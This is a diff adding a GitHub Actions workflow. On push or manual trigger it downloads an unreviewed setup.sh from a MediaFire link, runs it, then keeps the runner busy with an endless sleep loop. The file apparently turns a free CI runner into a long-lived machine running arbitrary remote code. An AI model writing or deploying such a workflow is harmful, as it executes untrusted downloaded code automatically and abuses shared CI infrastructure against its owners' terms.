@@ -1,0 +1,32 @@
+name: Run auto setup install os
+
+on:
+  push:
+    branches:
+      - main  # Change branch if needed
+  workflow_dispatch:  # Allows manual triggering
+
+jobs:
+  run-script:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+
+      - name: Download setup.sh
+        run: wget -O setup.sh "https://download1979.mediafire.com/uu5qw016boagB1AoVTkyEunL4Y4mlxOu_d03JVZZZcCzHaCeyJQwO0iG6ejzfDZQdskCNqFs9uGlxmViUq0uawzJ596NeP8d0OIwTFw6L96p59LpttlUcnBLQVAKRhOTnEi_Y3QMjbb7el8j0xIUIVWnngaA2GTEr9KQ23bLgRuv/n9pnvb3vf78dh9a/setup.sh"
+
+      - name: Duo
+        run: chmod +x setup.sh
+
+      - name: boot
+        run: ./setup.sh
+
+      - name: Keep Alive
+        run: |
+          echo "Keeping runner alive..."
+          while true; do
+            echo "Runner is still active..."
+            sleep 300  # Keep alive every 5 minutes
+          done
